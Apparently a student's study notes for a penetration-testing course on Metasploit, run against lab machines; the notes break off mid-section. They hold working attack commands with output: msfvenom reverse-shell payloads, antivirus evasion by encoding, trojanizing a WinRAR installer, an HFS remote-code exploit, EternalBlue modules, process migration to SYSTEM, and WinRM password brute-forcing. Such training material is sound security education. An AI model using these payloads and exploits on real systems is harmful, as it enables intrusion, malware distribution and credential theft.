# Section 3 course 3: Host & Network Penetration Testing: The Metasploit Framework (MSF)



### Table of Contents

- ##### Metasploit

  - Metasploit Framework Overview
    - Metasploit Fundamentals

  - MSFconsole Fundamentals    
    - Installing & Configuring The Metasploit Framework
    - Creating & Managing Workspaces    

- ##### Information Gathering & Enumeration

  - Nmap
    - import nmap scan to metasploit

  - Enumeration

- **Vulnerability Scanning**

  - MSF
  - Nessus
  - Web Apps

- **Client-Side Attacks**

  - Payloads
  - Automating

- **Exploitation**

  - Windows Exploitation
    - Exploiting A Vulnerable HTTP File Server
    - Exploiting Windows MS17-010 SMB Vulnerability
    - Exploiting WinRM (Windows Remote Management Protocol)
    - Exploiting A Vulnerable Apache Tomcat Web Server
  - Linux Exploitation
    - Exploiting A Vulnerable FTP Server    
    - Exploiting Samba    
    - Exploiting A Vulnerable SSH Server    
    - Exploiting A Vulnerable SMTP Server
  - Post Exploitation Fundamentals
    - Meterpreter Fundamentals 
    - Upgrading Command Shells To Meterpreter Shells    
  - Windows Post Exploitation
  - Linux Post Exploitation

- ##### Armitage

  - Metasploit GUIs
  - 










### Metasploit Fundamentals

+ The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.
+ It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.
+ It is also used to develop and test exploits and has one of the world’s largest database of public, tested exploits.
+ The Metasploit Framework is designed to be modular, allowing for new functionality to be implemented with ease.

#### Metasploit Terminologies

+ Interface – Methods of interacting with the Metasploit Framework.
+ Module – Pieces of code that perform a particular task, an example of a module is an
exploit.
+ Vulnerability –Weakness or flaw in a computer system or network that can be exploited.
+ Exploit – Piece of code/module that is used to take advantage a vulnerability within a system, service or application.
+ Payload – Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker.
+ Listener – A utility that listens for an incoming connection from a target.



#### Metasploit Modules

+ Exploit - A module that is used to take advantage of vulnerability and is typically paired with a payload.
+ Payload - Code that is delivered by MSF and remotely executed on the target after successful exploitation. An example of a payload is a reverse shell that initiates a connection from the target system back to the attacker.
+ Encoder - Used to encode payloads in order to avoid AV detection. For example, shikata_ga_nai is used to encode Windows payloads.
+ NOPS - Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
+ Auxiliary - A module that is used to perform additional functionality like port scanning and enumeration.

#### MSF Payload Types

When working with exploits, MSF provides you with two types of payloads that can be paired with an exploit:

1. Non-Staged Payload - Payload that is sent to the target system as is along with the exploit.
2. Staged Payload - A staged payload is sent to the target in two parts, whereby: The first part (stager) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of the payload (stage) and execute it.

#### Stagers & Stages

1. Stagers - Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is
downloaded and executed on the target system.
1. Stage - Payload components that are downloaded by the stager

#### Installing & Configuring The Metasploit Framework

**start postgresql database service**

```bash
┌──(kali㉿kali)-[~/.msf4/logs]
└─$ sudo systemctl start  postgresql
                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ sudo systemctl status  postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; prese>
     Active: active (exited) since Sun 2024-01-28 18:33:33 EST; 16s ago
    Process: 39341 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 39341 (code=exited, status=0/SUCCESS)
        CPU: 4ms

Jan 28 18:33:33 kali systemd[1]: Starting postgresql.service - PostgreSQL RD>
Jan 28 18:33:33 kali systemd[1]: Finished postgresql.service - PostgreSQL RD>
                      
```



**initialize the database **

```bash
└─# msfdb init
[i] Database already started
[i] The database appears to be already configured, skipping initialization
                      
┌──(root㉿kali)-[/home/kali]
└─# msfdb status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Sun 2024-01-28 18:33:33 EST; 5min ago
    Process: 39341 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 39341 (code=exited, status=0/SUCCESS)
        CPU: 4ms

Jan 28 18:33:33 kali systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
Jan 28 18:33:33 kali systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.

COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 39303 postgres    5u  IPv6  93661      0t0  TCP localhost:5432 (LISTEN)
postgres 39303 postgres    6u  IPv4  93662      0t0  TCP localhost:5432 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres   39303       1  0 18:33 ?        Ss     0:00 /usr/lib/postgresql/15

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
                                
```



**start metasploit**

```bash
┌──(root㉿kali)-[/home/kali]
└─# msfconsole            
```





#### MSFconsole Fundamentals    

**port scanning using metasploit `scanner/portscan/tcp` **

```bash
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.168.6.130
rhosts => 192.168.6.130
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.6.130:        - 192.168.6.130:135 - TCP OPEN
[+] 192.168.6.130:        - 192.168.6.130:139 - TCP OPEN
[+] 192.168.6.130:        - 192.168.6.130:445 - TCP OPEN
[+] 192.168.6.130:        - 192.168.6.130:5040 - TCP OPEN
[+] 192.168.6.130:        - 192.168.6.130:7680 - TCP OPEN
[*] 192.168.6.130:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > 

```



**connect to specific port with netcat using metasploit**

```bash
msf6 > connect 192.168.6.130 445
[*] Connected to 192.168.6.130:445 (via: 192.168.6.128:33861)
```



#### Creating & Managing Workspaces    

**connect to msfdb**

```bash
┌──(root㉿kali)-[/home/kali]
└─# systemctl start postgresql
                                                                                                       
┌──(root㉿kali)-[/home/kali]
└─# msfdb init
[i] Database already started
[i] The database appears to be already configured, skipping initialization
 
 
msf6 > db_status 
[*] Connected to msf. Connection type: postgresql.
 msf6 > workspace 
* default
```



**add new workspace**

```bash
msf6 > workspace -a test
[*] Added workspace: test
[*] Workspace: test
msf6 > workspace
  default
* test

```



**return to the default workspace**

```bash
msf6 > workspace default 
[*] Workspace: default
msf6 > workspace
  test
* default

```



**delete workspace**

```
msf6 > workspace -d test
[*] Added workspace: test
[*] Workspace: test

```



---

### Nmap

**XML format nmap result**

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap  192.168.6.129 -sV -oX linux_target
```



**import nmap scan to metasploit **

```bash
msf6 > workspace test 
[*] Workspace: test
msf6 > workspace
  default
* test
msf6 > db_import /home/kali/linux_target
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.13.10'
[*] Importing host 192.168.6.129
[*] Successfully imported /home/kali/linux_target
msf6 > hosts 

Hosts
=====

address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.6.129  00:0c:29:bf:ea:01        Linux                      server

msf6 > 
```



**show services running on the hosts**

```bash
msf6 > services 
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
192.168.6.129  21    tcp    ftp          open   vsftpd 2.3.4
192.168.6.129  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
192.168.6.129  23    tcp    telnet       open   Linux telnetd
192.168.6.129  25    tcp    smtp         open   Postfix smtpd
192.168.6.129  53    tcp    domain       open   ISC BIND 9.4.2
192.168.6.129  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
192.168.6.129  111   tcp    rpcbind      open   2 RPC #100000
192.168.6.129  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
192.168.6.129  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
```



**run nmap scan in metasploit and save the output in the database**

```bash
msf6 > db_nmap -A 192.168.6.129
```



**to list vulnerabilities if found**

```bash
msf6 > vulns 
```



---

### Enumeration







---

### Vulnerability Scanning

Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.

**metasploit-autopwn**

it identifies auto exploit modules for the ports that are currently open on the target system



```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
--2024-01-31 16:43:04--  https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17671 (17K) [text/plain]
Saving to: ‘db_autopwn.rb’

db_autopwn.rb             100%[====================================>]  17.26K  --.-KB/s    in 0.006s  

2024-01-31 16:43:04 (2.63 MB/s) - ‘db_autopwn.rb’ saved [17671/17671]

                                                                                                       
                                                                                                       
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cp db_autopwn.rb /usr/share/metasploit-framework/plugins  
```



**load autopwn plugin**

```bash
msf6 > load db_autopwn 
[*] Successfully loaded plugin: db_autopwn

msf6 > db_autopwn 
[-] The db_autopwn command is DEPRECATED
[-] See http://r-7.co/xY65Zr instead
[*] Usage: db_autopwn [options]
        -h          Display this help text
        -t          Show all matching exploit modules
        -x          Select modules based on vulnerability references
        -p          Select modules based on open ports
        -e          Launch exploits against all matched targets
        -r          Use a reverse connect shell
        -b          Use a bind shell on a random port (default)
        -q          Disable exploit module output
        -R  [rank]  Only run modules with a minimal rank
        -I  [range] Only exploit hosts inside this range
        -X  [range] Always exclude hosts inside this range
        -PI [range] Only exploit hosts with these ports open
        -PX [range] Always exclude hosts with these ports open
        -m  [regex] Only run modules whose name matches the regex
        -T  [secs]  Maximum runtime for any exploit in seconds

```



**recommend exploits to all open ports**

```bash
msf6 > db_autopwn -p -t
```



**recommend exploits to specific port**

```bash
msf6 > db_autopwn -p -t -PI 445
[-] The db_autopwn command is DEPRECATED
[-] See http://r-7.co/xY65Zr instead
^V^[[B^[[B^[[B^[[B[*] Analysis completed in 86 seconds (0 vulns / 0 refs)
[*] 
[*] ================================================================================
[*]                             Matching Exploit Modules
[*] ================================================================================
[*]   192.168.6.129:445  exploit/freebsd/samba/trans2open  (port match)
[*]   192.168.6.129:445  exploit/linux/samba/chain_reply  (port match)
[*]   192.168.6.129:445  exploit/linux/samba/is_known_pipename  (port match)
[*]   192.168.6.129:445  exploit/linux/samba/lsa_transnames_heap  (port match)
[*]   192.168.6.129:445  exploit/linux/samba/setinfopolicy_heap  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms06_040_netapi  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms06_066_nwapi  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms06_066_nwwks  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms06_070_wkssvc  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms07_029_msdns_zonename  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms08_067_netapi  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms10_061_spoolss  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms17_010_eternalblue  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/ms17_010_psexec  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/psexec  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/smb_doublepulsar_rce  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/smb_relay  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/smb_rras_erraticgopher  (port match)
[*]   192.168.6.129:445  exploit/windows/smb/timbuktu_plughntcommand_bof  (port match)

```







**analyze**

analyze command will analyze the contents of the metasploit database and (hosts and services) and provide a list of vulnerabilities that can be exploited 

```bash
msf6 > analyze
```



---

### Nessus







---

### Client-Side Attacks

+ A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.
+ Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).
+ Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
+ Given that this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be cognisant of AV detection.



**Msfvenom **

+ Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.
+ Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.
+ We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect
back to our payload handler and provide us with remote access to the target system.









#### Payloads

**Generating Payloads With Msfvenom**

list all payloads

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom --list payloads
```



**create x86 and x64 windows payloads**

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -f exe > payload_x86.exe
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
                                                                                                       
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x64 --platform windows  -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -f exe > payload_x64.exe
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes

```



**create x86 and x64 linux payloads**

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom  --platform linux  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -f elf > payload_linux_86
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom  --platform linux  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -f elf > payload_linux_64
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```





**list all payload formats**

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom --list formats
```





**set listener**

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload  windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.6.128
LHOST => 192.168.6.128
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.6.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.6.128:4444 

```







**Encoding Payloads With Msfvenom    **

+ Given that this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be cognisant of AV detection.
+ Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.
+ We can evade older signature based AV solutions by encoding our payloads.
+ Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.



**Shellcode**

+ Shellcode (shell-code) is a piece of code typically used as a payload for exploitation.
+ It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.



**list all encoders**

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom --list encoders 
```



**generate encoded windows payload**

1 iterations of x86/shikata_ga_nai

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -e x86/shikata_ga_nai  -f exe > payload_x86_encoded.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
```



**generate encoded windows payload**

1 iterations of x86/shikata_ga_nai

the more iterations of encoding payload, the better chances to bypass an antivirus

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -e x86/shikata_ga_nai -i 10  -f exe > payload_x86_encoded_10.exe
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
```



**Injecting Payloads Into Windows Portable Executables with `-x` option**

generate a 32-bit meterpreter payload and inject it into the WinRAR setup file 

- from [winrar](https://www.win-rar.com/download.html?&L=0) download [WinRAR 6.24 English 32 bit](https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x32-624.exe)

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -e x86/shikata_ga_nai -i 10  -f exe -x winrar-x32-624.exe  > malicious_winrar.exe      
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 3311280 bytes
 

  

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.6.128:1234 
[*] Sending stage (175686 bytes) to 192.168.6.130
[*] Meterpreter session 1 opened (192.168.6.128:1234 -> 192.168.6.130:50885) at 2024-01-31 18:57:01 -0500

meterpreter > getuid
Server username: DESKTOP-QVJK86B\pc1
meterpreter > sysinfo 
Computer        : DESKTOP-QVJK86B
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pgrep lsass
664

meterpreter > migrate 664
[*] Migrating from 1232 to 664...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : DESKTOP-QVJK86B
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-QVJK86B
[*] Current server process: lsass.exe (664)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 6224
[+] Successfully migrated into process 6224

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```



**maintain the actual functionality of the Portable Executables that you inject your payload into with `-k` option**

when the target clicks on the payload, it will launch up the WinRAR wizard setup (actual functionality) and also execute the meterpreter payload

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp LHOST=192.168.6.128 LPORT=1234 -e x86/shikata_ga_nai -i 10  -f exe -x winrar-x32-624.exe -k  > malicious_winrar_keep.exe
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Error: The template file doesn't have any exports to inject into!
```

Error because this portable executable may not provide the ability to inject code into it and you should test it with another one. This techinque is really not used anymore because of the fact that antivirus solutions have become much more comprehensive in regards to the ability to detect payloads especially msfvenom payloads





#### Automating

**Metasploit Resource Scripts**

+ Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.
+ They operate similarly to batch scripts, whereby, you can specify a set of Msfconsole commands that you want to execute sequentially.
+ You can the load the script with Msfconsole and automate the execution of the commands you specified in the resource script.
+ We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.



**create resource script and run it**

```bash
┌──(kali㉿kali)-[~]
└─$ nano portscan_metasploit.rc 
└─$ cat portscan_metasploit.rc 
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.6.128
run
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ msfconsole -r portscan_metasploit.rc                                           

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0
Metasploit Documentation: https://docs.metasploit.com/

[*] Processing portscan_metasploit.rc for ERB directives.
resource (portscan_metasploit.rc)> use auxiliary/scanner/portscan/tcp
resource (portscan_metasploit.rc)> set RHOSTS 192.168.6.128
RHOSTS => 192.168.6.128
resource (portscan_metasploit.rc)> run


```



**or run the resource script from inside metasploit** 

```bash
msf6 > resource portscan_metasploit.rc
[*] Processing /home/kali/portscan_metasploit.rc for ERB directives.
resource (/home/kali/portscan_metasploit.rc)> use auxiliary/scanner/portscan/tcp
resource (/home/kali/portscan_metasploit.rc)> set RHOSTS 192.168.6.128
RHOSTS => 192.168.6.128
resource (/home/kali/portscan_metasploit.rc)> run
```





**export commands of module configurations from (use module_name to run) into a resource script**

```bash
msf6 auxiliary(scanner/portscan/tcp) > makerc ~/Desktop/portscan.rc
[*] Saving last 3 commands to ~/Desktop/portscan.rc ...
```



---

### Exploitation

#### Windows Exploitation

#### Exploiting A Vulnerable HTTP File Server

+ An HTTP File Server (HFS) is a web server that is designed for file & document sharing.
+ HTTP File Servers typically run on TCP port 80 and utilize the HTTP protocol for underlying communication.
+ Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux.
+ Rejetto HFS V2.3 is vulnerable to a remote command execution attack.
+ MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.

```bash
root@attackdefense:~# nmap  10.4.30.234 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 19:10 IST
Nmap scan report for 10.4.30.234
Host is up (0.0094s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

```



```bash
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > options 

Module options (exploit/windows/http/rejetto_hfs_exec):
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS  10.4.30.234
RHOSTS => 10.4.30.234
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.22.3:4444 
[*] Using URL: http://0.0.0.0:8080/FDph3SiziXgi
[*] Local IP: http://10.10.22.3:8080/FDph3SiziXgi
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /FDph3SiziXgi
[*] Sending stage (180291 bytes) to 10.4.30.234
[*] Meterpreter session 1 opened (10.10.22.3:4444 -> 10.4.30.234:49258) at 2024-02-02 19:11:24 +0530
[!] Tried to delete %TEMP%\hBXxLKOHk.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > pgrep lsass
496

meterpreter > migrate 496
[*] Migrating from 1572 to 496...
[*] Migration completed successfully.

meterpreter > sysinfo 
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```



---

#### Exploiting Windows MS17-010 SMB Vulnerability

+ EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
+ The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
+ The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
+ The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
+ This vulnerability affects multiple versions of Windows:
  + Windows Vista
  + Windows 7
  + Windows Server 2008
  + Windows 8.1
  + Windows Server 2012
  + Windows 10
  + Windows Server 2016
+ Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.
+ The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
+ The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.



There is an auxiliary scanner that we can run to determine if a target is vulnerable to [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).

```bash
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```



Once we have determined that our target is indeed vulnerable to EternalBlue, we can **use** the following exploit module from the search we just did.

```bash
msf5 > use exploit/windows/smb/ms17_010_eternalblue
```





---

#### Exploiting WinRM (Windows Remote Management Protocol)

+ Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.
+ WinRM is typically used in the following ways:
+ Remotely access and interact with Windows hosts on a local network.
+ Remotely access and execute commands on Windows systems on the internet.
+ Manage and configure Windows systems remotely.
+ WinRM typically uses TCP port 5985 and 5986 (HTTPS).
+ WinRM implements access control and security for communication between systems through various forms of authentication.
+ We can utilize the MSF to identify WinRM users and their passwords as well as execute commands on the target system.
+ We can also utilize a MSF WinRM exploit module to obtain a meterpreter session on the target system.



```bash
root@attackdefense:~# nmap 10.4.19.50 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-15 21:39 IST
Nmap scan report for 10.4.19.50
Host is up (0.0100s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm


root@attackdefense:~# nmap 10.4.19.50 -sV -p5985,47001
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-15 21:41 IST
Nmap scan report for 10.4.19.50
Host is up (0.0100s latency).

PORT      STATE SERVICE VERSION
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```

 winrm server is running on port 5985. By default WinRM service uses port 5985 for HTTP



<br />

**bruteforce winRM credentials using metasploit `scanner/winrm/winrm_login`**

```bash
msf > use scanner/winrm/winrm_login
msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.4.19.50
RHOSTS => 10.4.19.50
msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/winrm/winrm_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/winrm/winrm_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/winrm/winrm_login) > run

[+] 10.4.19.50:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/winrm/winrm_login) > 

```

<br />

**Checking WinRM supported authentication method using an auxiliary module `auxiliary/scanner/winrm/winrm_auth_methods`**

This is very important to know, before we try to connect to the WinRM service. We need to use a valid authentication method while connecting to the service. You can find more information about the authentication from the below link:
https://docs.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections

```bash
